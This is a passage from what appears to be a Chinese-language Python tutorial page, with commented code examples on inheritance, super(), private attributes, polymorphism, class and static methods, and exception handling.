class=\"line\">    pass  # 不新增代码，用pass带过，防止报错</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 创建对象，验证结论</span><br><span class=\"line\">result = B()</span><br><span class=\"line\">result.print_info()</span><br><span class=\"line\"></span><br><span class=\"line\"># 注意：在python中，所有类默认继承object类，object类时顶级类或基类，其他子类叫派生类</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------单继承-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 师父类，属性和方法</span><br><span class=\"line\">class Master(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Ancient formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 徒弟类，继承师父类</span><br><span class=\"line\">class Prentice(Master):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 用徒弟类创建对象，调用实例属性和方法</span><br><span class=\"line\">daqiu = Prentice()</span><br><span class=\"line\">print(daqiu.kongfu)</span><br><span class=\"line\">daqiu.make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------多继承-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 师父类，属性和方法</span><br><span class=\"line\">class Master(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Ancient formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 学校类，属性和方法</span><br><span class=\"line\">class School(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Black horse formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 定义徒弟类，继承师父类 和 学校类</span><br><span class=\"line\">class Prentice(Master, School):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class Prentice1(School, Master):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">daqiu = Prentice()</span><br><span class=\"line\">print(daqiu.kongfu)</span><br><span class=\"line\">daqiu.make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\">daqiu1 = Prentice1()</span><br><span class=\"line\">print(daqiu1.kongfu)</span><br><span class=\"line\">daqiu1.make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\"># 结论：如果一个类继承多个父类，优先继承第一个父类的同名属性和方法</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------子类重写父类同名属性和方法-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 师父类，属性和方法</span><br><span class=\"line\">class Master(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Ancient formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 学校类，属性和方法</span><br><span class=\"line\">class School(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Black horse formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 定义徒弟类，继承师父类 和 学校类</span><br><span class=\"line\">class Prentice(Master, School):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Original technology of Chinese hamburger]&#x27;</span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">daqiu = Prentice()</span><br><span class=\"line\">print(daqiu.kongfu)</span><br><span class=\"line\">daqiu.make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\"># __mro__用来查看继承顺序</span><br><span class=\"line\">print(Prentice.__mro__)</span><br><span class=\"line\"></span><br><span class=\"line\"># 结论：如果子类拥有和父类同名的属性和方法，用子类创建对象调用属性和方法的时候，</span><br><span class=\"line\"># 调用到的是子类内部的同名属性和方法</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------子类调用父类同名属性和方法-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 师父类，属性和方法</span><br><span class=\"line\">class Master(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Ancient formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 学校类，属性和方法</span><br><span class=\"line\">class School(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Black horse formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 定义徒弟类，继承师父类 和 学校类</span><br><span class=\"line\">class Prentice(Master, School):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Original technology of Chinese hamburger]&#x27;</span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        # 添加自己的初始化原因：如果不加这个自己的初始化，</span><br><span class=\"line\">        # kongfu的属性值是上一次调用init内的kongfu属性值</span><br><span class=\"line\">        self.__init__()</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 子类调用父类的同名属性和方法：把父类的同名属性和方法再次封装</span><br><span class=\"line\">    def make_master_cake(self):</span><br><span class=\"line\">        # 父类类名.函数()</span><br><span class=\"line\">        # 再次调用初始化的原因：这里想要调用父类的同名属性和方法，属性在init初始化位置，</span><br><span class=\"line\">        # 所以需要再次调用init</span><br><span class=\"line\">        Master.__init__(self)</span><br><span class=\"line\">        Master.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_school_cake(self):</span><br><span class=\"line\">        School.__init__(self)</span><br><span class=\"line\">        School.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">daqiu = Prentice()</span><br><span class=\"line\">print(daqiu.kongfu)</span><br><span class=\"line\">daqiu.make_cake()</span><br><span class=\"line\">daqiu.make_master_cake()</span><br><span class=\"line\">daqiu.make_school_cake()</span><br><span class=\"line\">daqiu.make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------多层继承-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Master(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Ancient formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class School(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Black horse formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Prentice(Master, School):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Original technology of Chinese hamburger]&#x27;</span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        self.__init__()</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_master_cake(self):</span><br><span class=\"line\">        Master.__init__(self)</span><br><span class=\"line\">        Master.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_school_cake(self):</span><br><span class=\"line\">        School.__init__(self)</span><br><span class=\"line\">        School.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\"># 步骤：1. 创建类Tusun，用这个类创建对象；2. 用这个对象调用父类的属性和方法看能否成功</span><br><span class=\"line\">class Tusun(Prentice):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">xiaoqiu = Tusun()</span><br><span class=\"line\">xiaoqiu.make_cake()</span><br><span class=\"line\">xiaoqiu.make_master_cake()</span><br><span class=\"line\">xiaoqiu.make_school_cake()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------super()方法-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用super()可以自动查找父类，调用顺序遵循__mro__类属性的顺序，比较适合单继承使用</span><br><span class=\"line\">class Master(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Ancient formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class School(Master):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Black horse formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 2.1 super()带参数写法</span><br><span class=\"line\">        # super(School, self).__init__()</span><br><span class=\"line\">        # super(School, self).make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\">        # 2.2 无参数super</span><br><span class=\"line\">        super().__init__()</span><br><span class=\"line\">        super().make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\">class Prentice(School):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Original technology of Chinese hamburger]&#x27;</span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        self.__init__()</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_master_cake(self):</span><br><span class=\"line\">        Master.__init__(self)</span><br><span class=\"line\">        Master.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_school_cake(self):</span><br><span class=\"line\">        School.__init__(self)</span><br><span class=\"line\">        School.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 需求：一次性调用父类Master，School的方法</span><br><span class=\"line\">    def make_old_cake(self):</span><br><span class=\"line\">        # 方法一：如果定义的类名修改，这里也有修改，代码量大，冗余</span><br><span class=\"line\">        &quot;&quot;&quot;</span><br><span class=\"line\">        School.__init__(self)</span><br><span class=\"line\">        School.make_cake(self)</span><br><span class=\"line\">        Master.__init__(self)</span><br><span class=\"line\">        Master.make_cake(self)</span><br><span class=\"line\">        &quot;&quot;&quot;</span><br><span class=\"line\">        # 方法二：super()</span><br><span class=\"line\">        # 2.1 super(当前类名, self).函数()</span><br><span class=\"line\">        # super(Prentice, self).__init__()</span><br><span class=\"line\">        # super(Prentice, self).make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\">        # 2.2 无参数super</span><br><span class=\"line\">        super().__init__()</span><br><span class=\"line\">        super().make_cake()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">daqiu = Prentice()</span><br><span class=\"line\">daqiu.make_old_cake()</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------私有属性和方法-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义语法：在属性名和方法名前面加上两个下划线__</span><br><span class=\"line\"># 作用：设置某个实例属性或实例方法不继承给子类</span><br><span class=\"line\">#</span><br><span class=\"line\"># 获取私有属性：get_xx()</span><br><span class=\"line\"># 修改私有属性：set_xx()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Master(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Ancient formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class School(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Black horse formula for Chinese hamburger]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Prentice(Master, School):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.kongfu = &#x27;[Original technology of Chinese hamburger]&#x27;</span><br><span class=\"line\">        self.__money = 200 # 定义私有属性</span><br><span class=\"line\"></span><br><span class=\"line\">    # 定义函数，获取私有属性值：get_xx</span><br><span class=\"line\">    def get_money(self):</span><br><span class=\"line\">        return self.__money</span><br><span class=\"line\">    # 定义函数，修改私有属性值：set_xx</span><br><span class=\"line\">    def set_money(self):</span><br><span class=\"line\">        self.__money = 500</span><br><span class=\"line\"></span><br><span class=\"line\">    # 定义私有方法</span><br><span class=\"line\">    def __info_print(self):</span><br><span class=\"line\">        print(&#x27;This is private func&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def make_cake(self):</span><br><span class=\"line\">        self.__init__()</span><br><span class=\"line\">        print(f&#x27;Apply &#123;self.kongfu&#125; to make a piece of Chinese hamburger&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_master_cake(self):</span><br><span class=\"line\">        Master.__init__(self)</span><br><span class=\"line\">        Master.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\">    def make_school_cake(self):</span><br><span class=\"line\">        School.__init__(self)</span><br><span class=\"line\">        School.make_cake(self)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Tusun(Prentice):</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">xiaoqiu = Tusun()</span><br><span class=\"line\"></span><br><span class=\"line\"># print(xiaoqiu.money)</span><br><span class=\"line\"># print(xiaoqiu.__money)</span><br><span class=\"line\"># xiaoqiu.__info_print() # 私有属性和方法调用则报错</span><br><span class=\"line\"></span><br><span class=\"line\">print(xiaoqiu.get_money()) # 调用获取私有属性的方法</span><br><span class=\"line\"></span><br><span class=\"line\">xiaoqiu.set_money() # 调用修改私有属性的方法</span><br><span class=\"line\"></span><br><span class=\"line\">print(xiaoqiu.get_money())</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"面向对象之多态\"><a href=\"#面向对象之多态\" class=\"headerlink\" title=\"面向对象之多态\"></a>面向对象之多态</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 面向对象三大特性：封装，继承，多态</span><br><span class=\"line\"># 多态：传入不同的对象，产生不同的结果</span><br><span class=\"line\"></span><br><span class=\"line\">#需求：警务人员和警犬一起工作，警犬分两种：追击敌人和追查毒品，携带不同的警犬，执行不同的工作</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 定义父类，提供公共方法 警犬 和 人</span><br><span class=\"line\">class Dog(object):</span><br><span class=\"line\">    def work(self):</span><br><span class=\"line\">        pass</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 定义子类，子类重写父类方法</span><br><span class=\"line\">class ArmyDog(Dog):</span><br><span class=\"line\">    def work(self):</span><br><span class=\"line\">        print(&#x27;chase enemy&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class DrugDog(Dog):</span><br><span class=\"line\">    def work(self):</span><br><span class=\"line\">        print(&#x27;chase drug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义警务人员类</span><br><span class=\"line\">class Person(object):</span><br><span class=\"line\">    def work_with_dog(self, dog): # 接收对象的形参</span><br><span class=\"line\">        dog.work()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 创建对象，调用不同的功能，传入不同的对象，观察执行的结果</span><br><span class=\"line\"></span><br><span class=\"line\">ad = ArmyDog()</span><br><span class=\"line\">dd = DrugDog()</span><br><span class=\"line\"></span><br><span class=\"line\">daqiu = Person()</span><br><span class=\"line\">daqiu.work_with_dog(ad) # 把对象作为实参传入</span><br><span class=\"line\">daqiu.work_with_dog(dd)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"类属性和实例属性\"><a href=\"#类属性和实例属性\" class=\"headerlink\" title=\"类属性和实例属性\"></a>类属性和实例属性</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;------------------------设置和访问类属性-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 定义类，定义类属性</span><br><span class=\"line\">class Dog(object):</span><br><span class=\"line\">    tooth = 10</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建对象</span><br><span class=\"line\">wangcai = Dog()</span><br><span class=\"line\">xiaohei = Dog()</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 访问类属性：类和对象</span><br><span class=\"line\">print(Dog.tooth) # 类访问</span><br><span class=\"line\">print(wangcai.tooth) # 对象访问</span><br><span class=\"line\">print(xiaohei.tooth)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------修改类属性-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">class Dog(object):</span><br><span class=\"line\">    tooth = 10</span><br><span class=\"line\"></span><br><span class=\"line\">wangcai = Dog()</span><br><span class=\"line\">xiaohei = Dog()</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"># 1. 通过类修改类属性：类.类属性 = 值</span><br><span class=\"line\">Dog.tooth = 20</span><br><span class=\"line\">print(Dog.tooth)</span><br><span class=\"line\">print(wangcai.tooth)</span><br><span class=\"line\">print(xiaohei.tooth)</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 通过对象修改类属性：实际不能修改类属性，而是创建了一个实例属性</span><br><span class=\"line\">wangcai.tooth = 200</span><br><span class=\"line\"></span><br><span class=\"line\">print(Dog.tooth) # 10</span><br><span class=\"line\">print(wangcai.tooth) # 200</span><br><span class=\"line\">print(xiaohei.tooth) # 10</span><br><span class=\"line\"></span><br><span class=\"line\"># 注意：类属性只能通过类修改，不能通过实例对象修改，如果通过实例对象修改类属性，</span><br><span class=\"line\"># 表示的是创建了一个实例属性</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"类方法和静态方法\"><a href=\"#类方法和静态方法\" class=\"headerlink\" title=\"类方法和静态方法\"></a>类方法和静态方法</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------类方法-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需要用装饰器 @classmethod 来标识其为类方法，对于类方法，第一个参数必须是类对象，</span><br><span class=\"line\"># 一般以cls作为第一个参数</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 定义类：私有类属性，类方法获取这个私有属性</span><br><span class=\"line\">class Dog(object):</span><br><span class=\"line\">    __tooth = 10 # 定义私有属性用__</span><br><span class=\"line\"></span><br><span class=\"line\">    # 定义类方法</span><br><span class=\"line\">    @classmethod</span><br><span class=\"line\">    def get_tooth(cls): # 获取私有属性值get_xx</span><br><span class=\"line\">        return cls.__tooth</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建对象，调用类方法</span><br><span class=\"line\">wangcai = Dog()</span><br><span class=\"line\">result = wangcai.get_tooth()</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------静态方法-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 静态方法不需要传递类对象也不需要传递实例对象（形参没有self/cls）,</span><br><span class=\"line\"># 需要用装饰器 @staticmethod 来标识其为静态方法</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 定义类：定义静态方法</span><br><span class=\"line\">class Dog(object):</span><br><span class=\"line\">    @staticmethod</span><br><span class=\"line\">    def info_print():</span><br><span class=\"line\">        print(&#x27;This is static func&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建对象</span><br><span class=\"line\">wangcai = Dog()</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 调用静态方法：类 和 对象</span><br><span class=\"line\">wangcai.info_print()</span><br><span class=\"line\">Dog.info_print()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"拓展——综合\"><a href=\"#拓展——综合\" class=\"headerlink\" title=\"拓展——综合\"></a>拓展——综合</h1><h2 id=\"拓展-dict\"><a href=\"#拓展-dict\" class=\"headerlink\" title=\"拓展__dict__\"></a>拓展__dict__</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1.定义类</span><br><span class=\"line\">class A(object):</span><br><span class=\"line\">    a = 0</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.b = 1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2.创建对象</span><br><span class=\"line\">aa = A()</span><br><span class=\"line\"></span><br><span class=\"line\"># 3.调用__dict__</span><br><span class=\"line\"></span><br><span class=\"line\">print(A.__dict__) # 返回类内部所有属性和方法对应的字典</span><br><span class=\"line\"></span><br><span class=\"line\">print(aa.__dict__) # 返回实例属性和值组成的字典</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------体验异常-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：尝试打开test.txt(r)，如果文件不存在，用只写方式打开（w）</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">语法：</span><br><span class=\"line\">try:</span><br><span class=\"line\">    可能发生错误的代码</span><br><span class=\"line\">except</span><br><span class=\"line\">    发生错误的时候执行的代码</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">    f = open(&#x27;test.txt&#x27;, &#x27;r&#x27;)</span><br><span class=\"line\">except:</span><br><span class=\"line\">    f = open(&#x27;test.txt&#x27;, &#x27;w&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------异常类型-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 异常类型：NameError</span><br><span class=\"line\"># print(num)</span><br><span class=\"line\"></span><br><span class=\"line\"># ZeroDivisionError</span><br><span class=\"line\">print(1/0)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------捕获指定异常类型-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：尝试执行打印num，捕获异常类型NameError，如果捕获到这个异常类型，执行打印：有错误</span><br><span class=\"line\"># 注意：1. 如果尝试执行的代码的异常类型和要捕获的异常类型不一致，则无法捕获异常。</span><br><span class=\"line\">#      2. 一般try下方只放一行尝试执行的代码</span><br><span class=\"line\">try:</span><br><span class=\"line\">    # print(num)</span><br><span class=\"line\">    print(1/0)</span><br><span class=\"line\">except NameError:</span><br><span class=\"line\">    print(&#x27;Something Wrong&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------捕获指定异常类型-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">    print(1/0)</span><br><span class=\"line\">except (NameError, ZeroDivisionError):</span><br><span class=\"line\">    print(&#x27;Something Wrong&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------捕获异常描述信息-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">    print(num)</span><br><span class=\"line\">except (NameError, ZeroDivisionError) as result:</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------捕获所有异常以及异常的else-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># Exception是所有程序异常类的父类</span><br><span class=\"line\"></span><br><span class=\"line\"># 尝试执行打印num，捕获Exception 打印异常描述信息</span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">    print(num)</span><br><span class=\"line\">except Exception as result:</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------异常的else-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># else表示的是如果没有异常要执行的代码</span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">    print(1)</span><br><span class=\"line\">except Exception as result:</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&#x27;This is the code will run when no exception found&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------异常的finally-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># finally表示的是无论是否异常都要执行的代码，例如关闭文件</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：尝试以r打开文件，如果有异常以w打开这个文件，最终关闭文件</span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">    f = open(&#x27;test.txt&#x27;, &#x27;r&#x27;)</span><br><span class=\"line\">except Exception as result:</span><br><span class=\"line\">    f = open(&#x27;test.txt&#x27;, &#x27;w&#x27;)</span><br><span class=\"line\">finally:</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------异常的传递-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求1：尝试只读打开test.txt 文件存在读取内容，不存在提示用户</span><br><span class=\"line\"># 需求2：读取内容：循环读取，当无内容的时候退出循环，如果用户意外终止，提示用户已经被意外终止</span><br><span class=\"line\"></span><br><span class=\"line\">import time</span><br><span class=\"line\">try:</span><br><span class=\"line\">    f = open(&#x27;test.txt&#x27;)</span><br><span class=\"line\">    # 尝试循环读取内容</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            con = f.readline()</span><br><span class=\"line\">            # 如果读取完成退出循环</span><br><span class=\"line\">            if len(con) == 0:</span><br><span class=\"line\">                break</span><br><span class=\"line\"></span><br><span class=\"line\">            time.sleep(3)</span><br><span class=\"line\">            print(con)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        # 在命令提示符中如果按下ctrl+c结束终止的键</span><br><span class=\"line\">        print(&#x27;Program was interrupted unexpectedly&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">except:</span><br><span class=\"line\">    print(&#x27;The file is not exist&#x27;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------自定义异常-----------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 语法：raise 异常类对象</span><br><span class=\"line\"></span><br><span class=\"line\"># 1。自定义异常类，继承Exception，魔法方法有init和str(设置异常描述信息)</span><br><span class=\"line\">class ShortInputError(Exception): # 继承Exception父类</span><br><span class=\"line\">    def 